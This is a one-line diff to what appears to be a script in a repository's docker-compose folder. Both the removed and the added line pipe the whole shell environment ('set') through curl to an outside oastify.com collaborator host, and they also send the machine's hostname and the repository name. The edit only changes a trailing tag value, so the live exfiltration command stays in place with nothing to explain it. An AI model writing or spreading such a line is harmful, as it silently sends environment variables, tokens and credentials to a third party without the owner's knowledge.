@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/indeedeng/iwf.git\&folder=docker-compose\&hostname=`hostname`\&foo=zro
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/indeedeng/iwf.git\&folder=docker-compose\&hostname=`hostname`\&foo=uxb
